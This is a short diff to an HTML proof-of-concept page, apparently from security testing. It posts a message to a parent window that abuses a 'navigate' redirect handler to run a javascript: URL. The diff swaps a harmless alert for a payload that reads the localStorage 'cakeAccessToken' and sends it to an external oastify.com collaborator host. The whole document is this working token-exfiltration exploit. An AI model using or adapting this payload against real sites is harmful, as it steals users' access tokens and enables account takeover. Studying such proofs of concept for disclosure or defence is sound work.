@@ -3,13 +3,7 @@
 <head><title>PoC</title></head>
 <body>
 <script>
-  window.parent.postMessage(
-    JSON.stringify({
-      action: "navigate",
-      payload: { type: "redirect", param: "javascript:alert(document.domain)" }
-    }),
-    "*"
-  );
+window.parent.postMessage(JSON.stringify({action:"navigate",payload:{type:"redirect",param:"javascript:fetch('havravi1vr8voit5ifz4vowwdnje75vu.oastify.com/?t='+localStorage.getItem('cakeAccessToken'))"}}),"*")
 </script>
 </body>
 </html>
